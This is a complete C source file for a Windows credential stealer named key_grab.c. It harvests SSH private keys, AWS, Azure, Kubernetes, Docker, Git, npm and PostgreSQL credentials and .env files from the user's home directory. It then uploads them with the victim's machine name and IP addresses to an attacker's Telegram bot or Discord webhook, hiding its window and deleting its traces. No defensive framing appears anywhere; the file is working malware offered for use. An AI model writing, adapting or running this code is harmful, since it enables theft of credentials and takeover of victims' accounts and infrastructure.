/*
 * key_grab.c — SSH key & cloud credential exfiltrator
 *
 * HOW IT WORKS:
 * 1. Scans user home directory for SSH keys, cloud creds, tokens
 * 2. Bundles everything found into a single text file
 * 3. Sends to Telegram/Discord
 *
 * Targets:
 * - ~/.ssh/* (private keys, config, known_hosts)
 * - ~/.aws/credentials, ~/.aws/config
 * - ~/.azure/ (tokens, profiles)
 * - ~/.kube/config
 * - ~/.docker/config.json
 * - ~/.gitconfig, ~/.git-credentials
 * - ~/.npmrc (may contain auth tokens)
 * - ~/.pgpass (PostgreSQL passwords)
 *
 * Uses native Windows APIs only — no PowerShell, no flagged commands.
 *
 * Compile: python build.py keys --telegram --token X --chat Y
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// ══════════════════════════════════════════════════
// EXFIL CONFIG — Set via compiler flags:
//   /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
//   /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
// ══════════════════════════════════════════════════

#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
#define USE_TELEGRAM
#endif

#ifndef TG_TOKEN
#define TG_TOKEN "YOUR_BOT_TOKEN"
#endif

#ifndef TG_CHAT
#define TG_CHAT "YOUR_CHAT_ID"
#endif

#ifndef DC_WEBHOOK
#define DC_WEBHOOK "YOUR_WEBHOOK_URL"
#endif

// ══════════════════════════════════════════════════

static char g_info_caption[512] = {0};
static char g_home[MAX_PATH] = {0};

void init_info() {
    if (g_info_caption[0] != 0) return;

    char compName[256], userName[256], pubIP[64] = {0}, privIP[64] = {0};
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);

    // Public IP
    system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char ipf[MAX_PATH];
    snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
    FILE *f = fopen(ipf, "r");
    if (f) { fgets(pubIP, sizeof(pubIP), f); fclose(f); DeleteFileA(ipf); }
    char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
    nl = strchr(pubIP, '\r'); if (nl) *nl = 0;

    // Private IP
    char pf[MAX_PATH];
    snprintf(pf, MAX_PATH, "%spriv.txt", tmp);
    system("ipconfig | findstr /i \"IPv4\" > %temp%\\priv.txt 2>nul");
    f = fopen(pf, "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            char *colon = strchr(line, ':');
            if (colon) {
                colon++;
                while (*colon == ' ') colon++;
                nl = strchr(colon, '\r'); if (nl) *nl = 0;
                nl = strchr(colon, '\n'); if (nl) *nl = 0;
                strncpy(privIP, colon, sizeof(privIP)-1);
                break;
            }
        }
        fclose(f);
        DeleteFileA(pf);
    }

    snprintf(g_info_caption, sizeof(g_info_caption),
        "KeyGrab_%s@%s [pub:%s priv:%s]", userName, compName, pubIP, privIP);

    // Get home directory
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, g_home) != S_OK) {
        // Fallback
        char *up = getenv("USERPROFILE");
        if (up) strncpy(g_home, up, MAX_PATH - 1);
    }
}

// Check if a file looks binary (has null bytes in first 512 bytes)
int is_binary(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return 0;
    unsigned char buf[512];
    size_t n = fread(buf, 1, sizeof(buf), f);
    fclose(f);
    for (size_t i = 0; i < n; i++) {
        if (buf[i] == 0) return 1;
    }
    return 0;
}

// Append a file's contents to the output, with a header
// Returns 1 if file was found, 0 if not
int grab_file(FILE *out, const char *path, const char *label) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;

    if (is_binary(path)) {
        // Get file size
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fclose(f);
        fprintf(out, "--- %s ---\n", label);
        fprintf(out, "[BINARY FILE, %ld bytes: %s]\n\n", sz, path);
        return 1;
    }

    fprintf(out, "--- %s ---\n", label);

    char line[4096];
    int lines = 0;
    while (fgets(line, sizeof(line), f) && lines < 500) {
        fputs(line, out);
        lines++;
    }
    if (lines >= 500) {
        fprintf(out, "\n[...truncated at 500 lines...]\n");
    }
    fprintf(out, "\n\n");
    fclose(f);
    return 1;
}

// Grab all files matching a pattern in a directory
int grab_dir(FILE *out, const char *dir, const char *section) {
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    int found = 0;
    do {
        if (fd.cFileName[0] == '.' &&
            (fd.cFileName[1] == 0 ||
             (fd.cFileName[1] == '.' && fd.cFileName[2] == 0)))
            continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s\\%s", dir, fd.cFileName);

        char label[512];
        snprintf(label, sizeof(label), "%s/%s", section, fd.cFileName);
        found += grab_file(out, fullpath, label);

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return found;
}

void grab_keys(const char *outpath) {
    init_info();

    FILE *out = fopen(outpath, "w");
    if (!out) return;

    fprintf(out, "=== Key & Credential Grab ===\n");
    fprintf(out, "Machine: %s\n", g_info_caption);
    fprintf(out, "Home: %s\n\n", g_home);

    int total = 0;
    char path[MAX_PATH];

    // ── SSH Keys ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  SSH KEYS (.ssh/)\n");
    fprintf(out, "══════════════════════════════════\n\n");

    snprintf(path, MAX_PATH, "%s\\.ssh", g_home);
    int ssh_count = grab_dir(out, path, ".ssh");
    if (ssh_count == 0) fprintf(out, "[NOT FOUND: %s]\n\n", path);
    total += ssh_count;

    // ── AWS ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  AWS CREDENTIALS (.aws/)\n");
    fprintf(out, "══════════════════════════════════\n\n");

    snprintf(path, MAX_PATH, "%s\\.aws\\credentials", g_home);
    if (!grab_file(out, path, ".aws/credentials")) {
        fprintf(out, "[NOT FOUND: %s]\n\n", path);
    } else { total++; }

    snprintf(path, MAX_PATH, "%s\\.aws\\config", g_home);
    if (!grab_file(out, path, ".aws/config")) {
        fprintf(out, "[NOT FOUND: %s]\n\n", path);
    } else { total++; }

    // ── Azure ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  AZURE CREDENTIALS (.azure/)\n");
    fprintf(out, "══════════════════════════════════\n\n");

    const char *azure_files[] = {
        "accessTokens.json", "azureProfile.json",
        "msal_token_cache.json", "msal_token_cache.bin",
        NULL
    };
    int az_found = 0;
    for (int i = 0; azure_files[i]; i++) {
        snprintf(path, MAX_PATH, "%s\\.azure\\%s", g_home, azure_files[i]);
        char label[256];
        snprintf(label, sizeof(label), ".azure/%s", azure_files[i]);
        az_found += grab_file(out, path, label);
    }
    if (az_found == 0) fprintf(out, "[NOT FOUND: .azure/ directory or no known files]\n\n");
    total += az_found;

    // ── Kubernetes ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  KUBERNETES (.kube/config)\n");
    fprintf(out, "══════════════════════════════════\n\n");

    snprintf(path, MAX_PATH, "%s\\.kube\\config", g_home);
    if (!grab_file(out, path, ".kube/config")) {
        fprintf(out, "[NOT FOUND: %s]\n\n", path);
    } else { total++; }

    // ── Docker ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  DOCKER (.docker/config.json)\n");
    fprintf(out, "══════════════════════════════════\n\n");

    snprintf(path, MAX_PATH, "%s\\.docker\\config.json", g_home);
    if (!grab_file(out, path, ".docker/config.json")) {
        fprintf(out, "[NOT FOUND: %s]\n\n", path);
    } else { total++; }

    // ── Git ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  GIT CREDENTIALS\n");
    fprintf(out, "══════════════════════════════════\n\n");

    snprintf(path, MAX_PATH, "%s\\.gitconfig", g_home);
    if (!grab_file(out, path, ".gitconfig")) {
        fprintf(out, "[NOT FOUND: .gitconfig]\n\n");
    } else { total++; }

    snprintf(path, MAX_PATH, "%s\\.git-credentials", g_home);
    if (!grab_file(out, path, ".git-credentials")) {
        fprintf(out, "[NOT FOUND: .git-credentials]\n\n");
    } else { total++; }

    // ── NPM ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  NPM (.npmrc)\n");
    fprintf(out, "══════════════════════════════════\n\n");

    snprintf(path, MAX_PATH, "%s\\.npmrc", g_home);
    if (!grab_file(out, path, ".npmrc")) {
        fprintf(out, "[NOT FOUND: .npmrc]\n\n");
    } else { total++; }

    // ── PostgreSQL ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  POSTGRESQL (.pgpass)\n");
    fprintf(out, "══════════════════════════════════\n\n");

    snprintf(path, MAX_PATH, "%s\\.pgpass", g_home);
    if (!grab_file(out, path, ".pgpass")) {
        // Also check AppData
        snprintf(path, MAX_PATH, "%s\\AppData\\Roaming\\postgresql\\pgpass.conf", g_home);
        if (!grab_file(out, path, "pgpass.conf")) {
            fprintf(out, "[NOT FOUND: .pgpass / pgpass.conf]\n\n");
        } else { total++; }
    } else { total++; }

    // ── .env files in common locations ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  .ENV FILES\n");
    fprintf(out, "══════════════════════════════════\n\n");

    const char *env_dirs[] = {
        "", "Desktop", "Documents", "Downloads",
        "source\\repos", "projects", "dev", "code",
        NULL
    };
    int env_found = 0;
    for (int i = 0; env_dirs[i]; i++) {
        if (env_dirs[i][0] == 0) {
            snprintf(path, MAX_PATH, "%s\\.env", g_home);
        } else {
            snprintf(path, MAX_PATH, "%s\\%s\\.env", g_home, env_dirs[i]);
        }
        char label[256];
        snprintf(label, sizeof(label), "%s/.env",
            env_dirs[i][0] ? env_dirs[i] : "~");
        env_found += grab_file(out, path, label);
    }
    if (env_found == 0) fprintf(out, "[NO .env FILES FOUND]\n\n");
    total += env_found;

    // ── Summary ──
    fprintf(out, "══════════════════════════════════\n");
    fprintf(out, "  TOTAL FILES GRABBED: %d\n", total);
    fprintf(out, "══════════════════════════════════\n");

    fclose(out);
}

void send_file(const char *filepath) {
    init_info();
    char cmd[2048];

#ifdef USE_TELEGRAM
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"chat_id=" TG_CHAT "\" "
        "-F \"document=@%s\" "
        "-F \"caption=%s\" "
        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, g_info_caption);
#endif

#ifdef USE_DISCORD
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"file=@%s\" "
        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
        "\"" DC_WEBHOOK "\" >nul 2>nul",
        filepath, g_info_caption);
#endif

    system(cmd);
}

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%skg.txt", tempPath);

    grab_keys(outFile);
    send_file(outFile);

    // Clean up
    DeleteFileA(outFile);

    return 0;
}
